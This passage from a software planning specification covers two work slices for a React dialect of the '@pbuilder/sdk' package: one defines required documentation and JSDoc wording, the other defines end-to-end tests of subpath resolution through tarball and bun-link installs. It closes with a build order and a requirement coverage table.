## S-004: Docs — worked example, trust posture, honest limitations

**Scope**: edge-case · **Dimension**: — (documentation; single approval-style slice per Rules) · **Requires**: S-002 (documents both ops' final shape) · **Droppable**: No — docs REQs are signed spec; may land late, never drop.
**Covers**: REQ-RXD-09 (.1–.5)
**Test layers**: architectural (guard test)

### Contracts (pinned docs substance — from the design's Documentation Plan, ratified)

`docs/authoring-a-dialect.md` must gain, verbatim-substance:

- **Two-dialect intro reframe**: kill the stale "the first real dialect … five structured ops" framing — no sentence may describe `./typescript` as the only shipped dialect.
- **React worked example**: the COALESCED journey — `addImport` + `setJsxProp` on ONE handle — with byte output shown via `// ->` comments (the doc's existing convention), never an isolated single-op snippet.
- **2-op minimality framing**: states v1 ships exactly two ops, NAMES the React op-catalog follow-up as where additional ops land, shows `.modify(fn)` as the interim escape hatch.
- **Value-trust section**: REQ-RXD-12's wording — `value` is emitted verbatim, becomes executable code, untrusted input is the author's responsibility to sanitise.
- **Spread-precedence warning**: an inserted explicit prop lands AFTER a trailing `{...spread}` and therefore wins at React runtime.
- **Named-only `addImport` limitation**: default/mixed imports are catalog-follow-up scope.
- **Explicit-extension requirement**: always pass `.tsx`; extensionless paths are rejected — WITH the why: the extension must be explicit because future `.jsx` support would make an assumed extension ambiguous. Appears in `find`'s JSDoc AND as a worked-example note.
- **Pinned anchor sentinels**: the value-trust and spread-precedence sections each share a verbatim heading + sentence with `docs.test.ts`'s guard, so doc and guard cannot drift independently (mirrors the REQ-DAS-01.2 two-realms guard pattern).
- **Terminology**: author-facing text says "prop"; "attribute" reserved for grammar/injection rationale.
- **JSDoc fidelity**: per-op JSDoc on `setJsxProp`/`addImport` documents idempotency + rejection rule at the fidelity the TS dialect's `addImport`/`removeImport` JSDoc sets; `addImport`'s states the validation POSITIVELY (never advertise the TS op's laxity).

`README.md`: line-12 example gains `@pbuilder/sdk/react` only — NO new section.

### Acceptance (verbatim signed-spec scenarios)

REQ-RXD-09.1 — GIVEN the doc after this change WHEN scanned THEN it documents the exactly-two ops, v1 minimality, names the React op-catalog follow-up, and shows `.modify(fn)` as the escape hatch.
REQ-RXD-09.2 — GIVEN the doc's React worked example WHEN read THEN it chains `addImport` + `setJsxProp` on ONE handle and shows the byte output via `// ->` comments.
REQ-RXD-09.3 — GIVEN the doc's `setJsxProp` coverage WHEN the guard test scans it THEN a `value`-trust section AND the spread-precedence warning are present — the guard fails RED if either is removed.
REQ-RXD-09.4 — GIVEN the doc after this change WHEN scanned for the "first real dialect … five structured ops" framing THEN it is updated to acknowledge two dialects — no sentence describes `./typescript` as the only shipped dialect.
REQ-RXD-09.5 — GIVEN the shipped `find`'s JSDoc and the doc's React worked-example section WHEN scanned THEN both state the explicit-`.tsx` requirement — extensionless paths rejected — and name the forward-compatibility reason (future `.jsx` support).

### Tasks
- [ ] S-004.1 `docs/authoring-a-dialect.md` — all Contracts items above, incl. pinned anchor sentinels
- [ ] S-004.2 `README.md` line-12 example gains `@pbuilder/sdk/react`
- [ ] S-004.3 `test/dialects/react/docs.test.ts` — guard via the pinned sentinels (trust + spread + explicit-extension), failing-first
- [ ] S-004.4 regen FIT-04 `react.index.d.ts` baseline IF `find`'s JSDoc changed the emitted `.d.ts` (JSDoc trust line is FIT-04-pinned)

---

## S-005: Installed-consumer six-subpath parity

**Scope**: edge-case · **Dimension**: I (Interface — same capability proven through the packed-tarball AND bun-link entry points) · **Requires**: S-002 (probes must exercise real ops post-pack/post-link, not stubs) · **Droppable**: No — signed local-consumption delta; supply-chain-sensitive.
**Covers**: REQ-LC-01 (.1–.2), REQ-LC-02 (.1–.3), REQ-LC-03 (.1)
**Test layers**: e2e

### Contracts

`test/e2e/installed-consumer.e2e.test.ts` has TWO legs — packed-tarball install and `bun link` install — each probing every public subpath by package name. Copy-adaptable precedent: the `./typescript` probes at lines ~237–285 (tarball leg) and ~338–353 (bun-link leg), added when that subpath shipped. This slice extends BOTH probe matrices with `./react`; the founding-bug scenarios (write-only factory commits to a golden tree; all-or-nothing rejection surfaces an author-assertable `AuthoringError` with `reason: "path-collision"`) already exist in the file and re-run UNCHANGED — the slice only extends the subpath matrix and the count-parity assertion. The six public subpaths: `.`, `./commons`, `./conformance`, `./testing`, `./typescript`, `./react`; `@pbuilder/sdk/core` must stay UNRESOLVABLE on both legs.

### Acceptance (verbatim signed-spec scenarios)

REQ-LC-01.1 — GIVEN a sibling consumer with `@pbuilder/sdk` installed via `bun link` WHEN it imports `.`, `./commons`, `./conformance`, `./testing`, `./typescript`, `./react` by package name THEN all six resolve.
REQ-LC-01.2 — GIVEN the same consumer WHEN it imports `@pbuilder/sdk/core` THEN the import fails to resolve.
REQ-LC-02.1 — GIVEN a factory that only calls `create()` and never reads WHEN it runs through the bun-link-installed `./testing` entry via `runFactoryForTest` THEN the committed tree contains exactly the created file, byte-exact.
REQ-LC-02.2 — GIVEN a factory whose `create()` collides with a seeded path WHEN it runs through the bun-link-installed entry THEN the result's `error` is an `AuthoringError` with `reason: "path-collision"` and the committed tree is empty.
REQ-LC-02.3 — GIVEN the bun-link leg's scenario count and the tarball leg's WHEN compared THEN the bun-link leg asserts the same set — six-subpath resolution, `/core` unreachable, write-only commit, all-or-nothing rejection — not a subset.
REQ-LC-03.1 — GIVEN the e2e file after this change WHEN the pre-existing tarball-leg scenarios run alongside the extended probe set THEN the pre-existing scenarios pass with the same assertions they had before, AND the extended probe set additionally resolves `./react`.

### Tasks
- [ ] S-005.1 extend the tarball leg with a `./react` probe (adapt the `./typescript` probe shape)
- [ ] S-005.2 extend the bun-link leg with a `./react` probe + update the six-subpath count-parity assertion

---

## Build Order

1. S-000 (skeleton — implicit blocker for all)
2. S-001 (setJsxProp + validator core)
3. S-002 (addImport + coalescing + exact-op-set) — requires S-001
4. S-003, S-004, S-005 — all require only S-002; parallel-safe among themselves

## Anti-Pattern Check

- No horizontal/layer-named slices — every slice ships author-observable behavior.
- Every slice references ≥1 REQ-ID with embedded scenarios.
- No dual-dimension crosscuts (S-004 docs is the Rules-sanctioned undimensioned exception).
- 6 slices within the 4-7 L target; max dependency depth 1.

## REQ → Slice Coverage (all 17 REQ-IDs, no orphans)

| REQ-ID | Slice(s) |
|---|---|
| REQ-RXD-01 | S-000 (resolves) + S-002 (exact set) |
| REQ-RXD-02 | S-000 |
| REQ-RXD-03 | S-000 |
| REQ-RXD-04 | S-001 |
| REQ-RXD-05 | S-002 |
| REQ-RXD-06 | S-001 (elementName/propName) + S-002 (name/from) |
| REQ-RXD-07 | S-002 |
| REQ-RXD-08 | S-003 |
| REQ-RXD-09 | S-004 |
| REQ-RXD-10 | S-001 |
| REQ-RXD-11 | S-001 |
| REQ-RXD-12 | S-001 |
| REQ-RXD-13 | S-001 (setJsxProp paths) + S-002 (addImport + gate paths) |
| REQ-RXD-14 | S-000 |
| REQ-LC-01 | S-005 |
| REQ-LC-02 | S-005 |
| REQ-LC-03 | S-005 |
